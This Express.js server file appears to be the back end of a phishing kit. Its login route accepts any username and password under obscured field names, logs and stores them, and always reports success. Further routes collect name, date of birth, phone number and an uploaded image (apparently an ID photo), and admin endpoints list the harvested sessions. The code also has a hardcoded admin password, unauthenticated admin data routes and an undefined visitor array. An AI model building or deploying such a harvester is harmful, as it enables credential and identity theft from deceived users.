const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));


// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Accept only image files
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Database is now used for data storage
console.log('✅ Database connection initialized');

// Simple admin authentication (in production, use proper auth)
const ADMIN_PASSWORD = 'admin123'; // Simple password for demo

// Middleware to track site visitors
app.use((req, res, next) => {
  // Skip tracking for admin routes, API calls, and static files
  if (req.path.startsWith('/api/admin') || 
      req.path.startsWith('/api/health') || 
      req.path.startsWith('/api/track-visit') ||
      req.path.startsWith('/uploads') ||
      req.path.startsWith('/static') ||
      req.path.startsWith('/favicon')) {
    return next();
  }
  
  // Track visitor
  const visitor = {
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent'),
    timestamp: new Date().toISOString(),
    path: req.path,
    method: req.method
  };
  
  // Add to visitors array (keep only last 500 visitors)
  siteVisitors.push(visitor);
  if (siteVisitors.length > 500) {
    siteVisitors = siteVisitors.slice(-500);
  }
  
  next();
});

// Routes
app.post('/api/login', async (req, res) => {
  const { xusr, xpss } = req.body;
  
  console.log('Login attempt:', { xusr, xpss });
  
  try {
    // Create or get user session
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    const userSession = await db.createUserSession(ip, userAgent);
    
    // Store login data
    await db.storeLoginData(userSession.sessionId, { xusr, xpss }, ip, userAgent);
    
    // Store session ID in response for frontend to use
    res.json({ 
      success: true, 
      message: 'Login successful',
      sessionId: userSession.sessionId
    });
  } catch (error) {
    console.error('Error storing login data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/info', async (req, res) => {
  const { xname1, xname2, xdob, xtel, sessionId } = req.body;
  
  console.log('Info submission:', { xname1, xname2, xdob, xtel });
  
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    // Store info data
    await db.storeInfoData(sessionId, { xname1, xname2, xdob, xtel }, ip, userAgent);
    
    res.json({ success: true, message: 'Info submitted successfully' });
  } catch (error) {
    console.error('Error storing info data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/upload', upload.single('file'), async (req, res) => {
  const file = req.file;
  const { sessionId } = req.body;
  
  console.log('File upload request received');
  console.log('File object:', file);
  console.log('Session ID:', sessionId);
  
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    // Store upload data
    await db.storeUploadData(sessionId, {
      filename: file ? file.filename : null,
      originalName: file ? file.originalname : null,
      size: file ? file.size : 0,
      path: file ? file.path : null,
      mimeType: file ? file.mimetype : null
    }, ip, userAgent);
    
    res.json({ success: true, message: 'File uploaded successfully' });
  } catch (error) {
    console.error('Error storing upload data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/final', async (req, res) => {
  const { sessionId, ...data } = req.body;
  
  console.log('Final data submission:', data);
  
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    // Store final consolidated data
    await db.storeFinalData(sessionId, data, ip, userAgent);
    
    res.json({ success: true, message: 'Data submitted successfully' });
  } catch (error) {
    console.error('Error storing final data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

// Get collected data (for monitoring)
app.get('/api/data', async (req, res) => {
  try {
    const sessions = await db.getAllUserSessions();
    res.json(sessions);
  } catch (error) {
    console.error('Error retrieving data:', error);
    res.status(500).json({ error: 'Error retrieving data' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Track website visits
app.post('/api/track-visit', async (req, res) => {
  try {
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    const path = req.body.path || '/';
    
    // Track visitor in database
    await db.trackVisitor(ip, userAgent, path, 'GET');
    
    console.log('✅ Website visit tracked:', path, 'from', ip);
    
    res.json({ success: true, message: 'Visit tracked' });
  } catch (error) {
    console.error('Error tracking visit:', error);
    res.status(500).json({ success: false, message: 'Error tracking visit' });
  }
});

// Admin routes
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, message: 'Admin login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid admin password' });
  }
});

app.get('/api/admin/user-data', async (req, res) => {
  try {
    const sessions = await db.getAllUserSessions();
    res.json({
      success: true,
      data: sessions,
      total: sessions.length
    });
  } catch (error) {
    console.error('Error retrieving user data:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/visitors', async (req, res) => {
  try {
    const visitors = await db.getRecentVisitors(500);
    res.json({
      success: true,
      data: visitors,
      total: visitors.length
    });
  } catch (error) {
    console.error('Error retrieving visitors:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/stats', async (req, res) => {
  try {
    const stats = await db.getSessionStats();
    res.json({
      success: true,
      stats: stats
    });
  } catch (error) {
    console.error('Error retrieving stats:', error);
    res.status(500).json({ success: false, error: 'Error retrieving stats' });
  }
});

app.delete('/api/admin/delete-data/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  
  try {
    await db.deleteUserSession(sessionId);
    console.log(`Deleted session: ${sessionId}`);
    res.json({ success: true, message: 'Data deleted successfully' });
  } catch (error) {
    console.error('Error deleting session:', error);
    res.status(500).json({ success: false, message: 'Error deleting data' });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Error:', error);
  res.status(500).json({ error: error.message });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
});
